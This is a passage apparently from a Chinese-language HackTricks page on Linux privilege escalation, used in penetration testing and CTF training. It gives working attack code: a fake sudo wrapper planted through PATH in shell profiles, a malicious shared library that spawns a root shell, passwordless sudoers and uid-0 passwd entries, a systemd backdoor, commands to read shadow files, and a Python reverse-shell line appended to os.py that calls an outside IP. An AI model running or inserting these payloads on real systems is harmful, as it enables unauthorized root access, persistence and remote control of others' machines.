如果你知道某个 **user 通常会连接到一台 machine 并使用 `sudo`** 来提升权限，而你已经在该 user context 中获取了 shell，那么你可以**创建一个新的 sudo executable**，让它以 root 身份执行你的代码，然后再执行用户的 command。接着，**修改该 user context 的 $PATH**（例如在 `.bash_profile` 中添加新的 path），这样当用户执行 sudo 时，就会执行你的 sudo executable。

注意，如果用户使用的是其他 shell（不是 bash），你需要修改其他文件来添加新的 path。例如，[sudo-piggyback](https://github.com/APTy/sudo-piggyback) 会修改 `~/.bashrc`、`~/.zshrc` 和 `~/.bash_profile`。你还可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 中找到另一个示例。

或者运行类似以下的命令：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指示**加载的配置文件来自哪里**。通常，此文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着将读取 `/etc/ld.so.conf.d/*.conf` 中的配置文件。这些配置文件**指向其他文件夹**，系统将在这些文件夹中**搜索** **libraries**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统将在 `/usr/local/lib` 中搜索 libraries**。

如果由于某种原因，**某个用户对**以下任一路径具有**写权限**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 中的任意文件，或 `/etc/ld.so.conf.d/*.conf` 配置文件中指定的任意文件夹，则该用户可能能够提升权限。\
请查看以下页面中介绍的**如何利用此错误配置**：


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将该 lib 复制到 `/var/tmp/flag15/`，程序将按照 `RPATH` 变量的指定，在此位置使用它。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后，使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` 在 `/var/tmp` 中创建一个恶意 library。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities 为进程提供 **root 可用权限的一个子集**。这实际上将 root **权限拆分为更小且彼此独立的单元**。随后可以将这些单元分别授予进程。这样可以减少完整的权限集合，降低被利用的风险。\
阅读以下页面以 **进一步了解 capabilities 以及如何滥用它们**：


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

在目录中，**“execute”位**表示受影响的用户可以使用 "**cd**" 进入该文件夹。\
**“read”位**表示用户可以 **列出**其中的 **文件**，而 **“write”位**表示用户可以 **删除**和**创建**新的 **文件**。

## ACLs

访问控制列表（ACLs）代表自主权限控制的第二层，能够 **覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝特定用户（这些用户不是文件所有者，也不属于相应组）访问文件或目录，增强了对文件或目录访问权限的控制。这种 **细粒度控制确保了更精准的访问管理**。更多详情请参见[**此处**](https://linuxconfig.org/how-to-manage-acls-on-linux)。

**授予**用户 "kali" 对某个文件的读写权限：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取**具有特定 ACL 的文件：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins 中隐藏的 ACL backdoor

一种常见的错误配置是：`/etc/sudoers.d/` 中有一个归 root 所有、权限为 `440` 的文件，但仍通过 ACL 向低权限用户授予了写入权限。
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
如果你看到类似 `user:alice:rw-` 的内容，即使模式位受到限制，该用户仍可以追加 sudo 规则：
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
这是一个高影响的 ACL persistence/privesc 路径，因为在仅通过 `ls -l` 进行审查时很容易忽略它。

## Open shell sessions

在**旧版本**中，你可能可以**劫持**其他用户（**root**）的某些 **shell** session。\
在**最新版本**中，你只能**连接**到属于**你自己的用户**的 screen sessions。不过，你可能会在**session 内部找到有趣的信息**。

### screen sessions hijacking

**列出 screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Socket 位置（某些系统会将其中一个作为另一个的 symlink 暴露）：ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**连接到一个 session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux 会话劫持

这是 **旧版 tmux** 中存在的问题。我无法以非特权用户身份劫持由 root 创建的 tmux（v2.1）会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socket 位置（某些系统会将其中一个作为另一个的符号链接暴露）- tmux sessions hijacking：tmux -S /tmp/dev sess ls 使用该 socket 列出，你可以在该 socket 中启动一个 tmux session...](<../../images/image (837).png>)

**连接到一个 session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
查看 **HTB 中的 Valentine box** 作为示例。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006 年 9 月至 2008 年 5 月 13 日期间，在基于 Debian 的系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH keys 可能会受到此 bug 的影响。\
在这些 OS 中创建新的 SSH key 时会触发此 bug，因为**只有 32,768 种可能的变体**。这意味着可以计算出所有可能性，并且**通过 SSH public key 可以搜索对应的 private key**。你可以在此处找到已计算的可能性：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication：**指定是否允许 password authentication。默认值为 `no`。
- **PubkeyAuthentication：**指定是否允许 public key authentication。默认值为 `yes`。
- **PermitEmptyPasswords**：启用 password authentication 时，指定 server 是否允许登录到 password string 为空的 accounts。默认值为 `no`。

### Login control files

这些 files 会影响谁可以登录以及登录方式：

- **`/etc/nologin`**：如果存在，则阻止非 root 登录并显示其中的 message。
- **`/etc/securetty`**：限制 root 可以登录的位置（TTY allowlist）。
- **`/etc/motd`**：登录后的 banner（可能会 leak environment 或 maintenance details）。

### PermitRootLogin

指定 root 是否可以使用 SSH 登录，默认值为 `no`。可能的值：

- `yes`：root 可以使用 password 和 private key 登录
- `without-password` 或 `prohibit-password`：root 只能使用 private key 登录
- `forced-commands-only`：Root 只能使用 private key 登录，并且必须指定 commands options
- `no`：不允许

### AuthorizedKeysFile

指定包含可用于 user authentication 的 public keys 的 files。它可以包含 `%h` 等 tokens，这些 tokens 会被替换为 home directory。**你可以指定 absolute paths**（以 `/` 开头）或**相对于 user home 的 relative paths**。例如：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置表示：如果你尝试使用用户 "**testusername**" 的 **private** key 登录，ssh 将把你的 key 的 public key 与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 中的 key 进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **使用本地 SSH keys，而无需将 keys 留在服务器上**（没有 passphrases！）。因此，你可以通过 ssh **跳转**到 **一个 host**，然后从那里 **使用**位于 **初始 host** 中的 **key** **跳转到另一个** host。

你需要在 `$HOME/.ssh.config` 中按如下方式设置此选项：
```
Host example.com
ForwardAgent yes
```
注意，如果 `Host` 是 `*`，用户每次跳转到其他机器时，该主机都将能够访问这些密钥（这是一个安全问题）。

文件 `/etc/ssh_config` 可以**覆盖**这些**选项**，并允许或拒绝此配置。\
文件 `/etc/sshd_config` 可以通过关键字 `AllowAgentForwarding` **允许**或**拒绝** ssh-agent forwarding（默认为允许）。

如果你发现某个环境配置了 Forward Agent，请阅读以下页面，因为你**可能能够滥用它来提升权限**：


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### Profile 文件

文件 `/etc/profile` 以及 `/etc/profile.d/` 下的文件都是**用户运行新 shell 时执行的脚本**。因此，如果你能够**写入或修改其中任何文件，就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何异常的 profile 脚本，应检查其中是否包含**敏感信息**。

### Passwd/Shadow 文件

根据 OS 的不同，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，或者可能存在备份文件。因此，建议**查找所有这些文件**，并**检查是否可以读取**它们，以确认文件中**是否包含哈希**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd`（或等效）文件中找到 **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用以下命令之一生成密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
然后添加用户 `hacker`，并添加生成的密码。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如：`hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在你可以使用 `su` 命令，并输入 `hacker:hacker`

或者，你可以使用以下代码行添加一个没有密码的虚拟用户。\
警告：这可能会降低当前机器的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台中，`/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，此外，`/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以**写入某些敏感文件**。例如，你能否写入某个**服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果该机器正在运行 **tomcat** 服务器，并且你可以**修改 /etc/systemd/ 内的 Tomcat 服务配置文件，**那么你就可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的 backdoor 将在 tomcat 下次启动时执行。

### 检查目录

以下目录可能包含备份或有趣的信息：**/tmp**、**/var/tmp**、**/var/backups、 /var/mail、 /var/spool/mail、 /etc/exports、 /root**（你可能无法读取最后一个目录，但请尝试）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 异常位置/所有者异常的文件
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟内修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite 数据库文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history、.sudo_as_admin_successful、profile、bashrc、httpd.conf、.plan、.htpasswd、.git-credentials、.rhosts、hosts.equiv、Dockerfile、docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的脚本/二进制文件**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 包含密码的已知文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索**多个可能包含密码的文件**。\
**另一个可以用于此目的的有趣工具**是：[**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源应用程序，用于检索 Windows、Linux 和 Mac 本地计算机上存储的大量密码。

### 日志

如果你可以读取日志，就可能在其中找到**有趣/机密的信息**。日志越异常，就越可能有趣（大概如此）。\
此外，一些配置**不当**的（被植入后门的？）**审计日志**可能允许你将**密码记录**到审计日志中，具体说明见这篇文章：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了**读取日志，加入** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **组**将非常有帮助。

### Shell 文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 通用凭据搜索/Regex

你还应该检查文件的**名称**或**内容**中是否包含 "**password**"，并检查日志中的 IP 和电子邮件，或使用哈希正则表达式。\
这里不再列出执行所有这些操作的方法，但如果你感兴趣，可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## 可写文件

### Python library hijacking

如果你知道某个 python 脚本将从**哪里**执行，并且你**可以写入**该文件夹，或者你可以**修改 Python libraries**，那么你可以修改 OS library 并植入后门（如果你可以写入 python 脚本将要执行的位置，请复制并粘贴 os.py library）。

要**为 library 植入后门**，只需在 os.py library 的末尾添加以下行（修改 IP 和 PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 利用

`logrotate` 中的一个漏洞允许对日志文件或其父目录具有 **写权限** 的用户潜在地获取提升后的权限。这是因为 `logrotate` 通常以 **root** 身份运行，并且可以被操纵来执行任意文件，尤其是在 _**/etc/bash_completion.d/**_ 等目录中。需要检查的不仅是 _/var/log_ 中的权限，还包括应用日志轮转的任何目录中的权限。

> [!TIP]
> 此漏洞影响 `logrotate` `3.18.0` 及更早版本

有关该漏洞的更多详细信息，请参阅此页面：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 利用此漏洞。

此漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **（nginx logs）** 非常相似，因此每当你发现可以修改日志时，都应检查是谁在管理这些日志，并检查是否可以通过使用符号链接替换日志来提升权限。

### /etc/sysconfig/network-scripts/（Centos/Redhat）

**漏洞参考：** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果出于任何原因，用户能够向 _/etc/sysconfig/network-scripts_ **写入** 一个 `ifcf-<whatever>` 脚本，**或者**能够**修改**现有脚本，那么你的**系统就被攻陷了**。

以 _ifcg-eth0_ 为例，Network scripts 用于网络连接。它们看起来与 .INI 文件完全一样。不过，在 Linux 中它们会被 Network Manager（dispatcher.d）\~source\~。

在我的案例中，这些网络脚本中的 `NAME=` 属性未被正确处理。如果名称中包含**空格**，系统会尝试执行空格之后的内容。这意味着，**第一个空格之后的所有内容都会以 root 身份执行**。

例如：_/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_请注意 Network 和 /bin/id 之间的空格_)

### **init、init.d、systemd 和 rc.d**

`/etc/init.d` 目录包含 System V init（SysVinit）的**脚本**，这是 **经典的 Linux 服务管理系统**。其中包括用于 `start`、`stop`、`restart`，有时还包括 `reload` 服务的脚本。这些脚本可以直接执行，也可以通过 `/etc/rc?.d/` 中的符号链接执行。在 Redhat 系统中，另一种路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关联。Upstart 是由 Ubuntu 引入的较新的**服务管理**系统，使用配置文件执行服务管理任务。尽管系统已转向 Upstart，但由于 Upstart 中存在兼容层，SysVinit 脚本仍会与 Upstart 配置一起使用。

**systemd** 是一种现代初始化和服务管理器，提供按需启动 daemon、automount 管理以及系统状态快照等高级功能。它将 distribution packages 的文件组织在 `/usr/lib/systemd/` 中，并将管理员修改内容组织在 `/etc/systemd/system/` 中，从而简化系统管理流程。

## 其他技巧

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### 从受限 Shell 中逃逸


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks：manager-channel abuse

Android rooting frameworks 通常会 hook 某个 syscall，以向 userspace manager 暴露特权 kernel 功能。较弱的 manager authentication（例如基于 FD-order 的 signature checks 或不安全的 password schemes）可能使本地 app 冒充 manager，并在已 root 的设备上提升至 root 权限。在此了解更多信息和 exploitation 详情：


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE（CWE-426），通过基于 regex 的 exec（CVE-2025-41244）

VMware Tools/Aria Operations 中由 regex 驱动的 service discovery 可以从进程命令行中提取 binary path，并在 privileged context 下使用 -v 执行该路径。宽松的 pattern（例如使用 \S）可能匹配攻击者预先放置在可写位置中的 listener（例如 /tmp/httpd），从而以 root 身份执行（CWE-426 Untrusted Search Path）。

在此了解更多信息，以及适用于其他 discovery/monitoring stacks 的通用模式：

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 更多帮助

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **查找 Linux 本地 privilege escalation vectors 的最佳工具：** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**：[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)（-t option）\
**Enumy**：[https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check：** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker：** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot：** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop：** 枚举 Linux 和 MAC 中的 kernel vulns [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit：** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester：** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail（physical access）：** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**更多 scripts 的汇编：** [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning（Crontab UI privesc，zip -P creds reuse）](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era：为 cron-executed monitor 伪造 .text_sig payload](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025：Neighborhood Watch Bypass（sudo env_keep PATH hijack）](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka（通过 logs 进行 bash arithmetic injection，完整 chain）](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV（non-interactive startup file）](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment（sudo env_keep BASH_ENV → root）](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous（sudo terraform dev_overrides + TF_VAR symlink privesc）](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik（pg_basebackup cron copy → SUID bash）](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it（CVE-2025-41244）](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB：Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB：Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../../banners/hacktricks-training.md}}
